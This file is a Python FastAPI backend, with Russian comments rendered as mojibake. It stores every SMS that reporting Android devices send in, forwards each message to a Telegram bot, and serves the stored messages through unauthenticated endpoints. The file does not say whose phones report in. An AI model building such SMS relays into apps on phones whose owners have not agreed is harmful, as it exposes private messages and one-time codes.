"""
FastAPI —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø—Ä–∏–µ–º–∞ –¥–∞–Ω–Ω—ã—Ö –æ—Ç Android-—É—Å—Ç—Ä–æ–π—Å—Ç–≤
–ü—Ä–∏–Ω–∏–º–∞–µ—Ç —Å–æ–±—ã—Ç–∏—è —Ç—Ä–µ—Ö —Ç–∏–ø–æ–≤: device_status, sms, boot_completed
+ Webhook –¥–ª—è Telegram –±–æ—Ç–∞
"""
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import JSONResponse, FileResponse
from contextlib import asynccontextmanager
import uvicorn
from typing import Dict, Any
import os

from aiogram import Bot, Dispatcher, Router
from aiogram.types import Update
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from dotenv import load_dotenv

from app.database import (
    init_database, 
    save_event, 
    update_device, 
    save_sms,
    get_all_devices,
    get_device_by_id,
    get_device_sms
)
from app.telegram_notifications import init_telegram_bot, send_sms_notification_async

# –ó–∞–≥—Ä—É–∂–∞–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é
load_dotenv('config.env')

# –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ Telegram –±–æ—Ç–∞
from app import telegram_bot


# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
@asynccontextmanager
async def lifespan(app: FastAPI):
    """–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∂–∏–∑–Ω–µ–Ω–Ω—ã–º —Ü–∏–∫–ª–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è"""
    # Startup
    init_database()
    print("‚úÖ –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞")
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram –±–æ—Ç–∞ –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
    init_telegram_bot()
    
    # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ webhook –¥–ª—è Telegram
    webhook_url = os.getenv('WEB_URL', 'http://localhost:8000')
    if webhook_url and webhook_url != 'http://localhost:8000':
        try:
            await telegram_bot.bot.set_webhook(
                url=f"{webhook_url}/telegram/webhook",
                drop_pending_updates=True
            )
            print(f"‚úÖ Telegram webhook —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {webhook_url}/telegram/webhook")
        except Exception as e:
            print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ webhook: {e}")
    else:
        print("‚ö†Ô∏è WEB_URL –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω, webhook –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
    
    yield
    
    # Shutdown
    try:
        await telegram_bot.bot.delete_webhook()
        print("‚úÖ Telegram webhook —É–¥–∞–ª–µ–Ω")
    except:
        pass
    print("üëã –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")


# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è FastAPI –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
app = FastAPI(
    title="Device Manager API",
    description="API –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è Android —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞–º–∏",
    version="1.0.0",
    lifespan=lifespan
)


@app.post("/event")
async def receive_event(event: Dict[str, Any]):
    """
    –ü—Ä–∏–Ω–∏–º–∞–µ—Ç —Å–æ–±—ã—Ç–∏—è –æ—Ç Android-—É—Å—Ç—Ä–æ–π—Å—Ç–≤
    
    –¢–∏–ø—ã —Å–æ–±—ã—Ç–∏–π:
    - device_status: –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    - sms: –Ω–æ–≤–æ–µ SMS —Å–æ–æ–±—â–µ–Ω–∏–µ
    - boot_completed: —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–µ
    """
    try:
        print(f"\nüì• –ü–æ–ª—É—á–µ–Ω–æ —Å–æ–±—ã—Ç–∏–µ: {event.get('type', 'unknown')}")
        
        # –ü–æ–ª—É—á–∞–µ–º —Ç–∏–ø —Å–æ–±—ã—Ç–∏—è
        event_type = event.get('type')
        timestamp = event.get('timestamp')
        
        if not event_type or not timestamp:
            print(f"‚ùå –û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è. Event: {event}")
            raise HTTPException(
                status_code=400, 
                detail="–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è: type, timestamp"
            )
        
        # –î–ª—è SMS –≤—ã–≤–æ–¥–∏–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
        if event_type == "sms":
            print(f"   üì® SMS –¥–∞–Ω–Ω—ã–µ: from={event.get('from')}, message_length={len(event.get('message', ''))}")
        
        # –ò–∑–≤–ª–µ–∫–∞–µ–º –¥–∞–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏–∑ –≤–ª–æ–∂–µ–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
        device_data = event.get('device', {})
        device_id = device_data.get('id')
        device_name = device_data.get('name')
        battery = device_data.get('battery', 0)
        
        # –ï—Å–ª–∏ ID –Ω–µ—Ç –≤ device, –ø—ã—Ç–∞–µ–º—Å—è –Ω–∞–π—Ç–∏ –≤ –∫–æ—Ä–Ω–µ
        if not device_id:
            device_id = event.get('device_id')
        
        # –î–ª—è SMS —Å–æ–±—ã—Ç–∏–π –º–æ–∂–µ—Ç –Ω–µ –±—ã—Ç—å ID –≤ device, –Ω–æ –∏–º—è –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –∏–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ ID
        if not device_id and event_type == "sms" and device_name:
            # –ò—â–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –ø–æ –∏–º–µ–Ω–∏
            from app.database import get_connection
            conn = get_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT id FROM devices WHERE name = ? LIMIT 1", (device_name,))
            row = cursor.fetchone()
            if row:
                device_id = row['id']
                print(f"   –ù–∞–π–¥–µ–Ω device_id –ø–æ –∏–º–µ–Ω–∏: {device_id}")
            conn.close()
        
        if not device_id:
            print(f"‚ùå –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç device_id. Device data: {device_data}, event_type: {event_type}")
            raise HTTPException(
                status_code=400, 
                detail=f"–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç device.id –¥–ª—è —Å–æ–±—ã—Ç–∏—è {event_type}. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –±—ã–ª–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ —á–µ—Ä–µ–∑ device_status"
            )
        
        print(f"   Device ID: {device_id}, Type: {event_type}")
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ–±—ã—Ç–∏–µ –≤ —Ç–∞–±–ª–∏—Ü—É events
        save_event(device_id, event_type, timestamp, event)
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Å–æ–±—ã—Ç–∏–µ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–∏–ø–∞
        if event_type == "device_status":
            # –ò–∑–≤–ª–µ–∫–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ —Å–µ—Ç–∏
            network_data = event.get('network', {})
            internet_data = event.get('internet', {})
            
            # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º —É—Ä–æ–≤–µ–Ω—å —Å–∏–≥–Ω–∞–ª–∞ (1-4) –≤ –ø—Ä–æ—Ü–µ–Ω—Ç—ã
            signal_strength_raw = network_data.get('signalStrength', 0)
            signal_strength = int((signal_strength_raw / 4) * 100) if signal_strength_raw else 0
            
            # –ü–æ–ª—É—á–∞–µ–º —Ç–∏–ø —Å–µ—Ç–∏
            network_type = network_data.get('networkType', 'Unknown')
            
            # –ü–æ–ª—É—á–∞–µ–º —Ç–∏–ø –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
            internet_type = internet_data.get('type', 'Unknown')
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —É–∂–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –≤ –±–∞–∑–µ
            existing_device = get_device_by_id(device_id)
            
            # –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
            update_data = {
                'battery': battery,
                'signal_strength': signal_strength,
                'network_type': network_type,
                'internet': internet_type,
                'timestamp': timestamp
            }
            
            # –ò–º—è –¥–æ–±–∞–≤–ª—è–µ–º –¢–û–õ–¨–ö–û –µ—Å–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –µ—â–µ –Ω–µ—Ç –≤ –±–∞–∑–µ
            # –î–ª—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∏–º—è –ù–ï –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è (–º–æ–∂–Ω–æ –º–µ–Ω—è—Ç—å —Ç–æ–ª—å–∫–æ –≤—Ä—É—á–Ω—É—é —á–µ—Ä–µ–∑ API)
            if not existing_device:
                # –ù–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ - –∏—Å–ø–æ–ª—å–∑—É–µ–º –∏–º—è –∏–∑ —Å–æ–±—ã—Ç–∏—è
                update_data['name'] = device_name if device_name else f'Device {device_id}'
            # –î–ª—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –ù–ï –¥–æ–±–∞–≤–ª—è–µ–º 'name' - –∏–º—è —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è
            
            update_device(device_id, update_data)
            
        elif event_type == "sms":
            try:
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º SMS
                sender = event.get('from', 'Unknown')
                message = event.get('message', '')
                print(f"   üì® SMS –æ—Ç {sender}: {message[:50]}...")
                save_sms(device_id, timestamp, sender, message)
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
                try:
                    await send_sms_notification_async(device_id, sender, message, timestamp)
                except Exception as e:
                    print(f"   ‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
                    import traceback
                    traceback.print_exc()
                
                # –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –∏–∑ SMS —Å–æ–±—ã—Ç–∏—è
                has_signal = device_data.get('hasSignal', False)
                signal_strength_raw = device_data.get('signalStrength', 0)
                signal_strength = int((signal_strength_raw / 4) * 100) if signal_strength_raw else 0
                network_type = device_data.get('networkType', 'Unknown')
                internet_connected = device_data.get('internetConnected', False)
                
                # –û–±–Ω–æ–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ (–±–µ–∑ –∏–º–µ–Ω–∏, —á—Ç–æ–±—ã –Ω–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–µ)
                update_device(device_id, {
                    'battery': battery,
                    'signal_strength': signal_strength,
                    'network_type': network_type,
                    'internet': 'Connected' if internet_connected else 'Disconnected',
                    'timestamp': timestamp
                })
            except Exception as sms_error:
                print(f"‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ SMS: {sms_error}")
                import traceback
                traceback.print_exc()
                raise HTTPException(status_code=500, detail=f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ SMS: {str(sms_error)}")
            
        elif event_type == "boot_completed":
            # –ò–∑–≤–ª–µ–∫–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ —Å–µ—Ç–∏
            network_data = event.get('network', {})
            internet_data = event.get('internet', {})
            
            signal_strength_raw = network_data.get('signalStrength', 0)
            signal_strength = int((signal_strength_raw / 4) * 100) if signal_strength_raw else 0
            network_type = network_data.get('networkType', 'Unknown')
            internet_type = internet_data.get('type', 'Unknown')
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —É–∂–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –≤ –±–∞–∑–µ
            existing_device = get_device_by_id(device_id)
            
            # –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –ø–æ—Å–ª–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏
            update_data = {
                'battery': battery,
                'signal_strength': signal_strength,
                'network_type': network_type,
                'internet': internet_type,
                'timestamp': timestamp
            }
            
            # –ò–º—è –¥–æ–±–∞–≤–ª—è–µ–º –¢–û–õ–¨–ö–û –µ—Å–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –µ—â–µ –Ω–µ—Ç –≤ –±–∞–∑–µ
            # –î–ª—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∏–º—è –ù–ï –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è (–º–æ–∂–Ω–æ –º–µ–Ω—è—Ç—å —Ç–æ–ª—å–∫–æ –≤—Ä—É—á–Ω—É—é —á–µ—Ä–µ–∑ API)
            if not existing_device:
                # –ù–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ - –∏—Å–ø–æ–ª—å–∑—É–µ–º –∏–º—è –∏–∑ —Å–æ–±—ã—Ç–∏—è
                update_data['name'] = device_name if device_name else f'Device {device_id}'
            # –î–ª—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –ù–ï –¥–æ–±–∞–≤–ª—è–µ–º 'name' - –∏–º—è —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è
            
            update_device(device_id, update_data)
        
        return JSONResponse(
            status_code=200,
            content={
                "status": "success",
                "message": f"–°–æ–±—ã—Ç–∏–µ {event_type} —É—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ",
                "device_id": device_id,
                "type": event_type
            }
        )
        
    except HTTPException:
        raise
    except Exception as e:
        import traceback
        error_traceback = traceback.format_exc()
        print(f"‚ùå –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Å–æ–±—ã—Ç–∏—è:")
        print(error_traceback)
        raise HTTPException(status_code=500, detail=f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–±—ã—Ç–∏—è: {str(e)}")


@app.get("/devices")
async def list_devices():
    """
    –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
    """
    try:
        devices = get_all_devices()
        return JSONResponse(
            status_code=200,
            content={
                "status": "success",
                "count": len(devices),
                "devices": devices
            }
        )
    except Exception as e:
        import traceback
        print(f"‚ùå –û—à–∏–±–∫–∞ –≤ /devices: {str(e)}")
        print(traceback.format_exc())
        raise HTTPException(status_code=500, detail=f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤: {str(e)}")


@app.get("/device/{device_id}")
async def get_device(device_id: str):
    """
    –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
    """
    try:
        device = get_device_by_id(device_id)
        
        if not device:
            raise HTTPException(
                status_code=404, 
                detail=f"–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {device_id} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ"
            )
        
        return JSONResponse(
            status_code=200,
            content={
                "status": "success",
                "device": device
            }
        )
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {str(e)}")


@app.get("/device/{device_id}/sms")
async def get_device_sms_logs(device_id: str):
    """
    –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö SMS –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    """
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        device = get_device_by_id(device_id)
        if not device:
            raise HTTPException(
                status_code=404, 
                detail=f"–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {device_id} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ"
            )
        
        sms_list = get_device_sms(device_id)
        
        return JSONResponse(
            status_code=200,
            content={
                "status": "success",
                "device_id": device_id,
                "count": len(sms_list),
                "sms": sms_list
            }
        )
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è SMS: {str(e)}")


@app.put("/device/{device_id}/name")
async def update_device_name(device_id: str, request: Request):
    """
    –û–±–Ω–æ–≤–∏—Ç—å –∏–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    """
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        device = get_device_by_id(device_id)
        if not device:
            raise HTTPException(
                status_code=404, 
                detail=f"–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {device_id} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ"
            )
        
        # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–≤–æ–µ –∏–º—è –∏–∑ —Ç–µ–ª–∞ –∑–∞–ø—Ä–æ—Å–∞
        body = await request.json()
        new_name = body.get('name', '').strip()
        
        if not new_name:
            raise HTTPException(
                status_code=400,
                detail="–ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º"
            )
        
        if len(new_name) > 100:
            raise HTTPException(
                status_code=400,
                detail="–ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ (–º–∞–∫—Å–∏–º—É–º 100 —Å–∏–º–≤–æ–ª–æ–≤)"
            )
        
        # –û–±–Ω–æ–≤–ª—è–µ–º –∏–º—è –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö
        update_device(device_id, {'name': new_name})
        
        return JSONResponse(
            status_code=200,
            content={
                "status": "success",
                "message": "–ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–æ",
                "device_id": device_id,
                "name": new_name
            }
        )
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∏–º–µ–Ω–∏: {str(e)}")


@app.get("/")
async def root():
    """
    –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ - –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç HTML –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
    """
    index_path = os.path.join("templates", "index.html")
    if os.path.exists(index_path):
        return FileResponse(index_path)
    return {"message": "Device Manager API —Ä–∞–±–æ—Ç–∞–µ—Ç"}


@app.get("/device-page/{device_id}")
async def device_page(device_id: str):
    """
    –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    """
    device_path = os.path.join("templates", "device.html")
    if os.path.exists(device_path):
        return FileResponse(device_path)
    return {"message": f"–°—Ç—Ä–∞–Ω–∏—Ü–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ {device_id}"}


@app.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    """
    Webhook –¥–ª—è Telegram –±–æ—Ç–∞
    –ü—Ä–∏–Ω–∏–º–∞–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –æ—Ç Telegram –∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∏—Ö
    """
    try:
        update_data = await request.json()
        update = Update(**update_data)
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ –¥–∏—Å–ø–µ—Ç—á–µ—Ä
        await telegram_bot.dp.feed_update(telegram_bot.bot, update)
        
        return JSONResponse({"ok": True})
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ Telegram webhook: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)


@app.get("/telegram/webhook/info")
async def webhook_info():
    """
    –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ webhook
    """
    try:
        info = await telegram_bot.bot.get_webhook_info()
        return JSONResponse({
            "url": info.url,
            "has_custom_certificate": info.has_custom_certificate,
            "pending_update_count": info.pending_update_count,
            "last_error_date": info.last_error_date,
            "last_error_message": info.last_error_message,
            "max_connections": info.max_connections,
            "allowed_updates": info.allowed_updates
        })
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"–û—à–∏–±–∫–∞: {str(e)}")


# –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
if __name__ == "__main__":
    uvicorn.run(
        "main:app", 
        host="0.0.0.0", 
        port=8000, 
        reload=True,
        log_level="info"
    )

